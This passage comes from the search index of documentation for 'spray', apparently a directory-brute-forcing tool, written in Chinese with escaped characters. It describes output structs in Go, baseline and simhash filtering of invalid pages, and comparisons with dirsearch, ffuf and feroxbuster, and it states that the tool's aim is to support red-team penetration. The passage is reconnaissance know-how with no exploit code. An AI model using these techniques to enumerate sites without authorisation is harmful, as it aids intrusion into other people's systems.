\u53ef\u80fd\u5b58\u5728\u8bef\u5224\u6f0f\u5224, \u56e0\u6b64\u63d0\u4f9b\u4e86--fuzzy-file\u53c2\u6570\u5c06\u8fd9\u4e00\u9636\u6bb5\u88ab\u8fc7\u6ee4\u7684\u7ed3\u679c\u5355\u72ec\u8f93\u51fa\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u505a\u4eba\u5de5\u5206\u6790.</p> <ol> <li>\u5c06\u4f1a\u5bf9\u6bd4\u5bf9\u5e94baseline\u7684simhash, \u5982\u679csimhash\u7684\u9608\u503c\u5c0f\u4e8e5, \u5219\u8ba4\u4e3a\u662f\u76f8\u4f3c\u9875\u9762, \u88ab\u8fc7\u6ee4. \u53ef\u901a\u8fc7<code>--simhash-threshold</code>\u53c2\u6570\u8fdb\u884c\u4fee\u6539.</li> </ol> <p>\u4e3a\u4ec0\u4e48\u4e0d\u5bf9\u6240\u6709\u7684\u72b6\u6001\u7801\u4f7f\u7528\u6a21\u7cca\u8fc7\u6ee4?</p> <p>\u5047\u8bbe\u67d0\u4e2a\u7f51\u7ad9\u6b63\u5e38\u60c5\u51b5\u4e0b\u8fd4\u56de\u7684\u662f200, \u4f46\u6240\u6709\u7684api\u90fd\u4f1a\u8fd4\u56de405, \u5982\u679c\u5c06405\u52a0\u5230fuzzy\u72b6\u6001\u7801\u5217\u8868\u4e2d, \u90a3\u4e48\u6240\u6709\u7684api\u90fd\u4f1a\u88ab\u8fc7\u6ee4\u4e86. \u6240\u4ee5, spray\u53ea\u5bf9\u6211\u4eec\u8ba4\u4e3a\u7684\u5927\u6982\u7387\u65e0\u7528\u7684\u72b6\u6001\u7801\u8fdb\u884c\u4e86\u989d\u5916\u7684fuzzy\u8fc7\u6ee4, \u5176\u4ed6\u72b6\u6001\u7801\u53ea\u4f1a\u548cindex\u7684\u72b6\u6001\u7801\u8fdb\u884ccompare. </p> <p>\u76ee\u524d\u53ea\u6709\u8fd9\u4e00\u4e2a\u6b65\u9aa4, \u8fd8\u6709\u5176\u4ed6\u6a21\u7cca\u8fc7\u6ee4\u7684\u601d\u8def\u53ef\u4ee5\u4e00\u8d77\u4ea4\u6d41.</p> <p>\u5f53\u7136, \u4f7f\u7528spray\u5e76\u4e0d\u9700\u8981\u4e86\u89e3\u6bcf\u4e00\u4e2a\u7ec6\u8282, \u5982\u679c\u8f93\u51fa\u7684\u7ed3\u679c\u4e0d\u7b26\u5408\u9884\u671f, \u53ef\u4ee5\u6253\u5f00<code>--debug</code>\u67e5\u770b\u88ab\u8fc7\u6ee4\u7684\u539f\u56e0, \u5982\u679c\u8ba4\u4e3a\u5b58\u5728\u4e0d\u5408\u7406\u7684\u8fc7\u6ee4, \u8bf7\u63d0\u4ea4issue.</p>"},{"location":"spray/concept/#baseline","title":"Baseline","text":"<p>baseline\u65e2\u662fspray\u7684\u8f93\u51fa\u7684\u7ed3\u6784\u4f53, \u4e5f\u662f\u5b9e\u73b0\u5404\u79cd\u8fc7\u6ee4\u7b56\u7565\u4e0e\u9ad8\u7ea7\u529f\u80fd\u7684\u57fa\u77f3.</p> baseline\u7ed3\u6784\u4f53 <pre><code>type Baseline struct {\n    Number       int               `json:\"number\"`\n    IsValid      bool              `json:\"valid\"`\n    IsFuzzy      bool              `json:\"fuzzy\"`\n    UrlString    string            `json:\"url\"`\n    Path         string            `json:\"path\"`\n    Host         string            `json:\"host\"`\n    BodyLength   int               `json:\"body_length\"`\n    ExceedLength bool              `json:\"-\"`\n    HeaderLength int               `json:\"header_length\"`\n    RedirectURL  string            `json:\"redirect_url,omitempty\"`\n    FrontURL     string            `json:\"front_url,omitempty\"`\n    Status       int               `json:\"status\"`\n    Spended      int64             `json:\"spend\"` // \u8017\u65f6, \u6beb\u79d2\n    ContentType  string            `json:\"content_type\"`\n    Title        string            `json:\"title\"`\n    Frameworks   common.Frameworks `json:\"frameworks\"`\n    Extracteds   Extracteds        `json:\"extracts\"`\n    ErrString    string            `json:\"error\"`\n    Reason       string            `json:\"reason\"`\n    Source       SpraySource       `json:\"source\"`\n    ReqDepth     int               `json:\"depth\"`\n    Distance     uint8             `json:\"distance\"`\n    Unique       uint16            `json:\"unique\"`\n    *Hashes      `json:\"hashes\"`\n    Url       *url.URL       `json:\"-\"`\n    Dir       bool           `json:\"-\"`\n    Chunked   bool           `json:\"-\"`\n    Body      BS             `json:\"-\"`\n    Header    BS             `json:\"-\"`\n    Raw       BS             `json:\"-\"`\n    Response  *http.Response `json:\"-\"`\n    Recu      bool           `json:\"-\"`\n    RecuDepth int            `json:\"-\"`\n    URLs      []string       `json:\"-\"`\n    Collected bool           `json:\"-\"`\n    Retry     int            `json:\"-\"`\n}\n</code></pre> Framework \u7ed3\u6784\u4f53 <pre><code>type Framework struct {\n    Name    string       `json:\"name\"`\n    Version string       `json:\"version,omitempty\"`\n    From    int          `json:\"-\"`\n    Froms   map[int]bool `json:\"froms,omitempty\"`\n    Tags    []string     `json:\"tags,omitempty\"`\n    IsFocus bool         `json:\"is_focus,omitempty\"`\n    Data    string       `json:\"-\"`\n}\n</code></pre> Extracted \u7ed3\u6784\u4f53 <pre><code>type Extracted struct {\n    Name          string   `json:\"name\"`\n    ExtractResult []string `json:\"extract_result\"`\n}\n</code></pre> Hashes \u7ed3\u6784\u4f53 <pre><code>type Hashes struct {\n    BodyMd5       string `json:\"body-md5\"`\n    HeaderMd5     string `json:\"header-md5\"`\n    RawMd5        string `json:\"raw-md5\"`\n    BodySimhash   string `json:\"body-simhash\"`\n    HeaderSimhash string `json:\"header-simhash\"`\n    RawSimhash    string `json:\"raw-simhash\"`\n    BodyMmh3      string `json:\"body-mmh3\"`\n}\n</code></pre> <p>\u8fd9\u51e0\u4e2a\u7ed3\u6784\u4f53\u5c06\u4f5c\u4e3a\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\u7684\u5173\u952e</p>"},{"location":"spray/design/","title":"spray \u00b7 \u8bbe\u8ba1","text":""},{"location":"spray/design/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>(\u672c\u6587\u4e2d\u63d0\u5230\u7684\u76ee\u5f55 fuzz, \u76ee\u5f55\u7206\u7834, url \u7206\u7834\u4e3a\u540c\u4e00\u4e2a\u610f\u601d)</p> <p>spray \u7684\u8bbe\u8ba1\u4e0d\u9700\u8981\u50cf gogo \u8003\u8651\u975e\u5e38\u591a\u7684\u53d6\u820d\u95ee\u9898. spray \u7684\u76ee\u6807\u53ea\u6709\u4e00\u4e2a, \u89e3\u51b3\u5728\u76ee\u5f55 fuzz \u9886\u57df\u7684\u4e00\u5207\u95ee\u9898.</p> <p>\u4ee5 chainreactors \u4e00\u8d2f\u7684\u98ce\u683c, spray \u7684\u53c2\u6570\u8bbe\u8ba1\u4e00\u6837\u7684\u4f1a\u975e\u5e38\u590d\u6742, \u4f46\u5b9e\u9645\u4e0a\u5f88\u591a\u53c2\u6570\u5e76\u975e\u4e3a\u4eba\u7c7b\u51c6\u5907, \u800c\u662f\u4e3a\u4e86\u6210\u4e3a\u66f4\u5927\u6846\u67b6\u7684\u4e00\u90e8\u5206. \u5927\u591a\u6570\u4eba\u4f7f\u7528 spray \u53ea\u9700\u8981\u5173\u6ce8\u4e00\u4e9b\u6700\u57fa\u672c\u7684\u64cd\u4f5c\u5373\u53ef.</p> <p>\u76ee\u5f55\u7206\u7834\u5e76\u975e\u53ea\u662f\u6279\u91cf\u53d1\u5305\u5224\u65ad\u72b6\u6001\u7801, \u8fd9\u4e2a\u9886\u57df\u8fd8\u5305\u62ec\u4e86\u5bf9\u9690\u85cf\u76ee\u5f55\u7684\u53d1\u73b0, \u5b57\u5178\u7684\u81ea\u52a8\u5316\u6784\u9020, \u667a\u80fd\u5224\u65ad\u6709\u6548\u76ee\u5f55, \u722c\u866b\u4e0e\u6307\u7eb9\u8bc6\u522b, \u4e0e WAF \u7684\u5bf9\u6297\u7b49\u7b49</p>"},{"location":"spray/design/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":"<p>spray \u7684\u51fa\u53d1\u70b9\u60f3\u8981\u81ea\u52a8\u5316\u7684\u5206\u8fa8\u6709\u6548\u76ee\u5f55\u4e0e\u65e0\u6548\u76ee\u5f55, \u51cf\u5c11\u5bf9\u6570\u636e\u8fdb\u884c\u624b\u52a8\u4e8c\u6b21\u5206\u6790\u5904\u7406.</p>"},{"location":"spray/design/#\u5f00\u6e90\u4e16\u754c","title":"\u5f00\u6e90\u4e16\u754c","text":"<p>\u5e02\u9762\u4e0a\u6709\u5f88\u591a\u76ee\u5f55\u7206\u7834\u5de5\u5177\u6216\u8005\u7c7b\u4f3c\u7684 httpfuzz \u5de5\u5177.</p> <ul> <li>dirsearch python \u5f00\u53d1\u7684\u6709\u6027\u80fd\u74f6\u9888, \u6709\u4e00\u5b9a\u7684\u667a\u80fd\u5224\u65ad\u903b\u8f91, \u4f46\u8fd8\u4e0d\u591f\u667a\u80fd</li> <li>ffuf \u76ee\u524d http fuzz \u9886\u57df\u7684\u4f7c\u4f7c\u8005, \u4f46\u7f3a\u5c11\u5bf9\u76ee\u5f55\u7206\u7834\u7684\u4f18\u5316, \u6570\u636e\u7edd\u5927\u90e8\u5206\u60c5\u51b5\u9700\u8981\u4e8c\u6b21\u5904\u7406\u624d\u53ef\u4ee5\u4f7f\u7528. \u4e0e spray \u5b9a\u4f4d\u6709\u533a\u522b.</li> <li>feroxbuster \u76ee\u5f55\u7206\u7834\u9886\u57df\u7684\u4f7c\u4f7c\u8005, \u4e0e spray \u6709\u7740\u7c7b\u4f3c\u7684\u5b9a\u4f4d. \u65e0\u6cd5\u6279\u91cf\u7206\u7834, \u540c\u6837\u4e0d\u591f\u667a\u80fd, \u5728\u5b57\u5178\u5904\u7406\u4e0a\u4e0d\u591f\u81ea\u7531.</li> <li>gobuster \u66f4\u63a5\u8fd1 go \u7248\u672c\u7684 dirsearch. \u6027\u80fd\u4e0a\u6bd4 dirsearch \u66f4\u597d, \u80fd\u505a\u7684\u4e8b\u60c5\u4e0e dirsearch \u5dee\u4e0d\u591a</li> <li>kiterunner \u539f\u672c\u6211\u5f88\u770b\u597d\u7684\u9879\u76ee, \u4e00\u4e2a\u7ed3\u5408\u4e86\u76ee\u5f55\u7206\u7834\u4e0e apifuzz \u7684\u5de5\u5177, \u4f46\u540e\u7eed\u6ca1\u66f4\u65b0, \u6709\u4e0d\u5c11 bug.</li> <li>httpx \u5b83\u7684\u8bbe\u8ba1\u4e0a\u662f\u4e3a\u4e86\u4ece http \u534f\u8bae\u4e2d\u63d0\u53d6\u4fe1\u606f, \u4e5f\u6709\u4eba\u7528\u5b83\u6765\u8fdb\u884c\u76ee\u5f55\u7206\u7834, \u6548\u679c\u4e0a\u6765\u8bf4\u5e76\u4e0d\u597d, \u4f46\u5b83\u5bf9\u6570\u636e\u7684\u4e00\u4e9b\u5904\u7406\u65b9\u5f0f\u503c\u5f97\u5b66\u4e60</li> </ul> <p>spray \u6709\u4ece\u4e0a\u9762\u7684\u8fd9\u51e0\u4e2a\u5de5\u5177\u4e2d\u5b66\u5230\u4e00\u4e9b\u4e1c\u897f, \u4e5f\u6df1\u5165\u7684\u5206\u6790\u4e86\u8fd9\u4e9b\u5de5\u5177\u7684\u4f18\u7f3a\u70b9, \u5e76\u8fdb\u884c\u91cd\u65b0\u8bbe\u8ba1. \u4f46\u8bf7\u6ce8\u610f spray \u5e76\u975e\u662f\u5bf9\u4e0a\u9762\u8fd9\u4e9b\u5de5\u5177\u7684\u91cd\u65b0\u9020\u8f6e\u5b50, spray \u89e3\u51b3\u4e86\u4e0d\u5c11\u8fd9\u4e9b\u5de5\u5177\u6ca1\u6709\u8003\u8651\u8fc7\u7684\u95ee\u9898. \u4f1a\u5728\u540e\u7eed\u4e00\u4e00\u4ecb\u7ecd.</p> <p>\u8fd8\u6709\u4e00\u4e9b\u66f4\u53e4\u65e9, \u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\u7684\u9879\u76ee\u4e0d\u518d\u4ecb\u7ecd. \u4e5f\u6709\u4e00\u4e9b\u5728\u67d0\u4e2a\u7ec6\u5fae\u9886\u57df\u6709\u7a81\u7834\u7684\u5de5\u5177, \u5c06\u4f1a\u5728\u540e\u7eed\u4ecb\u7ecd.</p>"},{"location":"spray/design/#spray-\u7684\u603b\u4f53\u8bbe\u8ba1","title":"spray \u7684\u603b\u4f53\u8bbe\u8ba1","text":"<ul> <li>\u667a\u80fd\u5316, \u76ee\u5f55\u7206\u7834\u4e2d 99.9%\u7684\u5c1d\u8bd5\u90fd\u662f\u65e0\u6548\u7684, \u4e0d\u80fd\u8ba9\u4eba\u628a\u7cbe\u529b\u653e\u5728\u8fd9\u4e9b\u65e0\u6548\u7684\u6570\u636e\u5904\u7406\u4e0a. \u9700\u8981\u627e\u5230\u4e00\u4e2a\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\u667a\u80fd\u53bb\u9664\u65e0\u6548\u8bbe\u8ba1</li> <li>\u9002\u5e94\u6027, \u6bcf\u4e2a\u76ee\u6807\u90fd\u6709\u7740\u81ea\u5df1\u7684\u89c4\u5219, \u6839\u636e\u76ee\u6807\u53bb\u83b7\u53d6\u4fe1\u606f, \u6784\u9020\u5b57\u5178\u662f\u667a\u80fd\u5316\u7684\u57fa\u77f3. \u5c3d\u53ef\u80fd\u7684\u505a\u5230\u6839\u636e\u6bcf\u4e2a\u76ee\u6807\u6784\u9020\u4e0d\u540c\u7684\u5b57\u5178.</li> <li>\u81ea\u52a8\u5316\u4e0e\u5206\u5e03\u5f0f, spray \u9762\u5bf9\u7684\u573a\u666f\u5305\u62ec\u4e86\u5927\u89c4\u6a21\u9ad8\u5e76\u53d1\u7684\u76ee\u5f55\u63a2\u6d4b, \u8fd9\u6837\u7684\u573a\u666f\u5e76\u4e0d\u592a\u9002\u5408\u4eba\u5de5\u4f7f\u7528 spray, \u4e3a\u6b64 spray \u8bbe\u8ba1\u4e86\u4e00\u4e9b\u65b9\u5f0f\u6765\u9002\u914d\u8fd9\u6837\u7684\u573a\u666f.</li> <li>\u8f85\u52a9\u6027, spary \u5e76\u4e0d\u80fd\u505a\u5230\u53d1\u73b0\u6f0f\u6d1e, \u4f46\u5b83\u5c06\u5c3d\u53ef\u80fd\u7684\u5e2e\u52a9\u4eba\u7c7b\u53bb\u5206\u6790\u76f8\u5173\u7684\u4fe1\u606f.</li> </ul> <p>spray \u57fa\u4e8e\u76ee\u5f55\u7206\u7834\u5b9e\u73b0, \u4f46\u76ee\u5f55\u7206\u7834\u5e76\u4e0d\u662f spray \u7684\u76ee\u6807.</p> <p>spray \u6700\u7ec8\u7684\u76ee\u6807\u662f\u5bf9\u5355\u4e2a\u7ad9\u70b9\u6df1\u5165\u7684\u4fe1\u606f\u5206\u6790\u4e0e\u63d0\u53d6, \u53bb\u8f85\u52a9\u7ea2\u961f\u4eba\u5458\u8fdb\u4e00\u6b65\u7684\u6e17\u900f\u653b\u51fb.</p>"},{"location":"spray/design/#\u667a\u80fd\u5316","title":"\u667a\u80fd\u5316","text":"<p>\u80cc\u666f</p> <p>\u7edd\u5927\u591a\u6570\u76ee\u5f55\u7206\u7834\u5de5\u5177\u8fc7\u5ea6\u7b80\u5316\u4e86\u73b0\u5b9e\u4e16\u754c\u4e2d\u53ef\u80fd\u9047\u5230\u7684\u573a\u666f, \u5bfc\u81f4\u53ea\u80fd\u5728\u7406\u60f3\u72b6\u51b5\u4e0b\u5b9e\u73b0\u8fc7\u6ee4\u65e0\u6548\u9875\u9762. \u5f53\u9762\u5bf9\u590d\u6742\u7684\u771f\u5b9e\u573a\u666f, \u4ed6\u4eec\u7684\u8fd9\u79cd\u65b9\u5f0f\u65e2\u4f1a\u5bfc\u81f4\u8bef\u62a5, \u53c8\u4f1a\u5bfc\u81f4\u6f0f\u62a5. \u800c spray \u8981\u505a\u7684\u662f\u5c3d\u53ef\u80fd\u51cf\u5c11\u8bef\u62a5\u4e0e\u6f0f\u62a5.</p> <p>\u8fd9\u91cc\u6307\u7684\u667a\u80fd\u5316, \u5b9e\u9645\u4e0a\u662f\u6dfb\u52a0\u590d\u6742\u7684\u89c4\u5219, \u4ee3\u66ff\u4eba\u7c7b\u8fdb\u884c\u7edd\u5927\u591a\u6570\u91cd\u590d\u65e0\u6548\u7684\u52b3\u52a8. \u4e3b\u8981\u662f\u5c06\u6211\u4eec\u5bf9\u76ee\u5f55\u7206\u7834\u8fd9\u4e2a\u9886\u57df\u7684\u7ecf\u9a8c\u8f6c\u4e3a\u4ee3\u7801.</p> <p>spray \u7684\u667a\u80fd\u5224\u65ad\u662f\u6211\u4eec\u8ba4\u4e3a\u7684\u6700\u4f73\u89e3\u51b3\u65b9\u6848, \u4f46\u4e0d\u4e00\u5b9a\u662f\u5b9e\u9645\u4e0a\u7684\u6700\u4f73\u89e3\u51b3\u65b9\u6848. \u6709\u53ef\u80fd\u56e0\u4e3a\u667a\u80fd\u5224\u65ad\u53cd\u800c\u5bfc\u81f4\u4e86\u4e00\u4e9b\u6f0f\u5224\u8bef\u5224. \u4e5f\u4e3a\u6b64\u63d0\u4f9b\u4e86\u591a\u79cd\u8865\u6551\u4e0e\u7f13\u89e3\u65b9\u6848. \u6211\u4eec\u4e5f\u5728\u4e0d\u65ad\u6539\u8fdb\u6211\u4eec\u7684\u903b\u8f91\u5e76\u4e0d\u65ad\u5c06\u65b0\u7684\u7ecf\u9a8c\u6c89\u6dc0\u5230 spray \u7684\u4ee3\u7801\u4e2d.</p> <p>\u5728 feroxbuster \u4e0e dirsearch \u4e2d, \u5bf9\u6709\u6548\u76ee\u5f55\u7684\u5224\u65ad\u4e3b\u8981\u901a\u8fc7\u72b6\u6001\u7801\u4e0e body length. \u8fd9\u6837\u7684\u7b80\u5355\u5224\u65ad\u5728\u5f88\u591a\u573a\u666f\u4e0b\u662f\u4e0d\u8d77\u4f5c\u7528\u7684. \u9700\u8981\u901a\u8fc7\u624b\u52a8\u914d\u7f6e\u9ebb\u70e6\u7684<code>filter</code>, \u901a\u8fc7\u4eba\u5de5\u4ecb\u5165\u7684\u4e8c\u6b21\u5224\u65ad. \u8fd9\u79cd\u89e3\u51b3\u65b9\u6848\u5728\u5355\u4e2a\u76ee\u6807\u4e0a\u80fd\u901a\u8fc7\u51e0\u6b21\u4ea4\u4e92\u4fee\u6539\u627e\u5230\u4e00\u4e2a\u7279\u5b9a\u7684\u914d\u7f6e\u89e3\u51b3\u8fc7\u6ee4\u7684\u95ee\u9898, \u64cd\u4f5c\u8d77\u6765\u8f83\u4e3a\u9ebb\u70e6.</p> <p>\u5982\u679c\u6211\u4eec\u60f3\u4e00\u6b21\u6027\u5bf9\u591a\u4e2a\u76ee\u6807\u8fdb\u884c\u626b\u63cf, dirsearch \u4e0e feroxbuster \u7684\u624b\u52a8 filter \u903b\u8f91\u5c06\u4f1a\u5931\u6548, \u4e0d\u540c\u7f51\u7ad9\u4e4b\u95f4\u5b8c\u5168\u4e0d\u80fd\u4f7f\u7528\u540c\u4e00\u4e2a filter \u7b56\u7565. \u5e76\u4e14 feroxbuster \u91c7\u7528\u591a\u8fdb\u7a0b\u7684\u65b9\u5f0f\u8fdb\u884c\u591a\u76ee\u6807\u5e76\u53d1, \u51e0\u4e4e\u7834\u574f\u4e86\u5b83\u539f\u672c\u975e\u5e38\u4f18\u96c5\u76f4\u89c2\u7684\u8f93\u51fa\u754c\u9762. \u603b\u800c\u8a00\u4e4b, \u5f00\u6e90\u7684\u5de5\u5177\u5728 filter \u4e0a\u90fd\u4e0d\u591f\u667a\u80fd.</p> <p>\u800c ffuf \u4e0e httpx \u66f4\u662f\u53ea\u7528\u6765\u83b7\u53d6\u539f\u59cb\u6570\u636e, \u51e0\u4e4e 100%\u7684\u9700\u8981\u4eba\u5de5\u4ecb\u5165\u7684\u65b9\u5f0f\u8fdb\u884c\u4e8c\u6b21\u6570\u636e\u5904\u7406. \u5b83\u4eec\u867d\u7136\u4e5f\u63d0\u4f9b\u4e86\u5404\u79cd\u7684 filter \u4e4b\u7c7b\u7684\u529f\u80fd, \u4f46\u5728\u5b9e\u9645\u4f7f\u7528\u573a\u666f\u4e0a\u7684\u5b9a\u4f4d\u66f4\u63a5\u8fd1\u53d1\u5305\u5668.</p> <p>spray \u91c7\u7528\u7684\u65b9\u5f0f\u662f, \u83b7\u53d6\u4e24\u4e2a baseline(index \u9875\u9762\u4e0e\u968f\u673a\u9875\u9762)\u7684\u65b9\u5f0f, \u52a8\u6001\u7684\u6839\u636e\u6bcf\u4e2a\u7f51\u7ad9\u81ea\u8eab\u5efa\u7acb\u57fa\u51c6\u503c\u7684\u6a21\u578b. \u7136\u540e\u5728\u540e\u7eed\u5904\u7406\u4e2d, \u90fd\u4f1a\u6839\u636e\u8fd9\u4e24\u4e2a\u57fa\u51c6\u503c\u8fdb\u884c\u5224\u65ad. \u57fa\u672c\u4e0a\u89e3\u51b3\u4e86 90%\u7684\u573a\u666f.</p> <p>\u5f53\u7136\u73b0\u5b9e\u4e16\u754c\u4e2d\u4e0d\u4f1a\u5982\u6b64\u7b80\u5355, \u53ea\u9700\u8981\u4e24\u4e2a baseline \u4e0d\u53ef\u80fd\u89e3\u51b3\u6240\u6709\u7684\u95ee\u9898, \u4e3a\u4e86\u89e3\u51b3\u540e\u9762\u7684 10%\u7684\u95ee\u9898\u4ee5\u53ca\u4e3a\u4e86\u6027\u80fd\u4e0a\u7684\u4f18\u5316, spray \u5e76\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u4e09\u6bb5\u5f0f\u7684\u8fc7\u6ee4\u903b\u8f91, \u6bcf\u4e2a\u9636\u6bb5\u4e2d\u90fd\u6709\u5927\u91cf\u7684\u5224\u65ad\u903b\u8f91\u8fdb\u884c\u5c3d\u53ef\u80fd\u7684\u667a\u80fd\u5224\u65ad. \u5177\u4f53\u7684\u903b\u8f91\u53ef\u4ee5\u6587\u6863\u4e2d\u7684\u7ec6\u8282\u770b\u5230.</p> <p>\u5f53\u7136\u4e09\u4e2a\u4e09\u6bb5\u5f0f\u7684\u903b\u8f91\u52a0\u4e0a baseline \u89e3\u51b3\u4e86 99%\u7684\u95ee\u9898, \u4f46\u4e3a\u4e86\u6700\u540e\u7684 1%, \u8bbe\u8ba1\u7684 spray \u771f\u6b63\u6700\u590d\u6742\u529f\u80fd.</p> <p>\u8fd9\u4e9b\u529f\u80fd\u5305\u62ec</p> <ol> <li>\u901a\u8fc7\u6a21\u7cca hash, \u5bf9\u7f51\u9875\u76f8\u4f3c\u5ea6\u8fdb\u884c\u5bf9\u6bd4</li> <li>\u901a\u8fc7\u6a21\u7cca\u72b6\u6001\u7801\u8fdb\u884c\u66f4\u8fdb\u4e00\u6b65\u7684\u52a8\u6001 baseline. \u5373\u6a21\u7cca\u72b6\u6001\u7801\u5217\u8868\u4e2d\u7684\u7ed3\u679c\u4f1a\u4e0e\u76f8\u540c\u72b6\u6001\u7684 baseline \u8fdb\u884c\u5bf9\u6bd4</li> <li>\u624b\u52a8\u7ef4\u62a4\u7684\u667a\u80fd\u8fc7\u6ee4\u72b6\u6001\u7801\u5217\u8868, \u4e00\u5b9a\u7a0b\u5ea6\u8c03\u6574\u4e09\u6bb5\u5f0f\u903b\u8f91</li> <li><code>--match</code>\u4e0e<code>--filter</code>\u7684\u8868\u8fbe\u5f0f\u8bed\u8a00\u8fdb\u884c\u624b\u52a8\u7684\u89c4\u5219\u914d\u7f6e</li> </ol> <p>\u901a\u8fc7\u8fd9\u51e0\u4e2a\u5bf9\u4e09\u6bb5\u5f0f\u667a\u80fd\u8fc7\u6ee4\u7684\u8865\u5145, \u6211\u4eec\u624d\u786e\u5b9a spray \u6709\u4e86\u5e94\u5bf9 100%\u573a\u666f\u7684\u80fd\u529b (\u6b22\u8fce\u627e\u4e00\u4e9b\u5947\u8469\u7f51\u7ad9\u7ed9\u6211\u51fa\u96be\u9898^ ^).</p> <p>\u5f53\u4f7f\u7528\u5230 3 \u548c 4 \u8fd9\u4e24\u4e2a\u9ad8\u7ea7\u529f\u80fd\u65f6, \u5b9e\u9645\u4e0a spray \u5c31\u9047\u5230\u4e86\u548c feroxbuster \u4e0e dirsearch \u7c7b\u4f3c\u7684\u56f0\u5883, \u9700\u8981\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4eba\u5de5\u624b\u52a8\u914d\u7f6e\u4e86. \u5f53\u7136\u4e5f\u4e0d\u662f\u6ca1\u6709\u89e3\u51b3\u529e\u6cd5, \u53ea\u4e0d\u8fc7\u89e3\u51b3\u65b9\u6848\u5728 spray \u4e4b\u5916, \u9700\u8981\u5f15\u5165\u66f4\u52a0\u5e9e\u5927\u7684\u5206\u6790\u5f15\u64ce\u53bb\u5b9e\u73b0. \u8fd9\u4e5f\u662f spray \u4f5c\u4e3a\u5de5\u4ef6\u7684\u610f\u4e49\u6240\u5728.</p> <p>\u800c\u901a\u8fc7 baseline, \u4e09\u6bb5\u5f0f\u8fc7\u6ee4, \u4ee5\u53ca\u8865\u5145\u529f\u80fd\u7684 1 \u4e0e 2. \u5728\u975e\u4eba\u5de5\u5e72\u9884\u7684\u60c5\u51b5\u4e0b, spray \u80fd\u8986\u76d6\u5230 99.9%\u7684\u573a\u666f. spray \u5df2\u7ecf\u505a\u5230\u4e86\u5bf9\u540c\u7c7b\u5de5\u5177\u7684\u8de8\u8d8a\u5f0f\u7a81\u7834.</p> <p>\u65e0\u6548\u7684 200 \u9875\u9762</p> <p>\u8fd9\u4e2a\u76f8\u5bf9\u6bd4\u8f83\u597d\u7406\u89e3, \u4f8b\u5982\u5b9e\u9645\u4e0a\u7684 404 \u9875\u9762\u8fd4\u56de 200 \u72b6\u6001\u7801. \u4f8b\u5982\u6cdb\u89e3\u6790\u7684\u76ee\u5f55, \u6240\u6709\u9875\u9762\u90fd\u8fd4\u56de\u4e86 200 \u72b6\u6001\u7801.</p> <p>\u662f\u5728\u5b9e\u6218\u4e2d\u6bd4\u8f83\u591a\u89c1\u7684\u60c5\u51b5, \u53ef\u80fd\u9488\u5bf9\u5355\u4e00\u60c5\u51b5\u5176\u4ed6\u5de5\u5177\u80fd\u8fdb\u884c\u624b\u52a8\u914d\u7f6e\u7684\u8fc7\u6ee4, \u4f46\u662f\u5982\u679c\u4e00\u4e2a\u7ad9\u6709\u597d\u51e0\u79cd\u4e0d\u540c\u7684 200 \u72b6\u6001\u7801, \u8fc7\u6ee4\u8d77\u6765\u8fd8\u662f\u6bd4\u8f83\u9ebb\u70e6\u7684.</p> <p>\u5728\u5355\u4e00 200 \u9875\u9762\u7684\u60c5\u51b5\u4e0b, \u5047\u5982 200 \u9875\u9762\u662f\u52a8\u6001\u7684, spray \u4e5f\u80fd\u5b8c\u7f8e\u7684\u8fdb\u884c\u8fc7\u6ee4. \u4f46\u662f\u5bf9\u4e8e\u591a\u4e2a\u6cdb\u89e3\u6790\u76ee\u5f55\u540c\u65f6\u5b58\u5728, \u4e14\u8fd4\u56de\u7684\u9875\u9762\u90fd\u4e0d\u540c. spray \u4e5f\u53ea\u80fd\u901a\u8fc7\u624b\u52a8\u914d\u7f6e\u53bb\u89e3\u51b3. \u76f8\u5bf9\u6bd4\u5176\u4ed6\u5de5\u5177\u7684\u624b\u8db3\u65e0\u63aa\u5df2\u7ecf\u6709\u4e86\u5f88\u5927\u8fdb\u6b65.</p> <p>\u6709\u6548\u7684 404 \u9875\u9762</p> <p>\u8fd9\u4e2a\u60c5\u51b5\u77e5\u9053\u7684\u4eba\u53ef\u80fd\u5c11\u4e00\u4e9b. \u5176\u5b9e\u4e5f\u548c\u5de5\u5177\u6709\u5173, \u4f7f\u7528\u5e02\u9762\u4e0a\u7684\u6240\u6709\u76ee\u5f55\u7206\u7834\u5de5\u5177\u53bb fuzz. \u9047\u5230 404 \u72b6\u6001\u7801, \u90fd\u4f1a\u9009\u62e9\u8fc7\u6ee4, \u4f7f\u7528\u8005\u6839\u672c\u65e0\u6cd5\u5224\u65ad\u6709\u6ca1\u6709\u53ef\u80fd\u5b58\u5728\u6709\u6548\u7684 404 \u9875\u9762. \u5728\u771f\u5b9e\u4e16\u754c\u4e2d, \u8fd9\u6837\u7684\u60c5\u51b5\u5728\u73b0\u4ee3\u5316\u7684\u7f51\u7ad9\u4e2d\u5e76\u4e0d\u5c11\u89c1.</p> <p>\u4e3e\u4e2a\u4f8b\u5b50, \u67d0\u4e2a\u7f51\u7ad9\u7ed9<code>/api</code>\u914d\u7f6e\u4e86\u6cdb\u89e3\u6790, \u4f46\u9664\u975e\u8bbf\u95ee\u5230<code>/api/getUser</code>\u662f\u8fd4\u56de 200, \u5176\u4ed6\u9875\u9762\u5747\u4e3a<code>404</code>.</p> <p>\u8fd9\u79cd\u60c5\u51b5, \u8fd9\u4e2a<code>/api</code>\u7684\u8def\u7531\u5b9e\u9645\u4e0a\u662f\u6709\u6548\u7684, \u53ef\u4ee5\u6784\u9020\u5b57\u5178\u8fdb\u884c fuzz, \u6216\u8005\u5bfb\u627e api \u6587\u6863\u8fdb\u884c\u6df1\u5ea6\u6d4b\u8bd5.</p> <p>\u5927\u90e8\u5206\u5de5\u5177\u53ea\u6709<code>/api</code>\u8fd9\u4e2a\u8def\u7531\u88ab\u914d\u7f6e\u4e3a 403 \u6216\u8005 200 \u7684\u65f6\u5019\u624d\u6709\u53ef\u80fd\u53d1\u73b0. \u4f46\u5728\u771f\u5b9e\u4e16\u754c\u4e2d, api \u901a\u5e38\u4f1a\u88ab\u91cd\u5199\u5176\u6240\u6709\u7684\u8f93\u51fa, \u4ee5\u4fdd\u8bc1\u7edf\u4e00\u683c\u5f0f\u4e3a json \u4e4b\u7c7b\u7684\u7ed3\u6784\u5316\u6570\u636e. 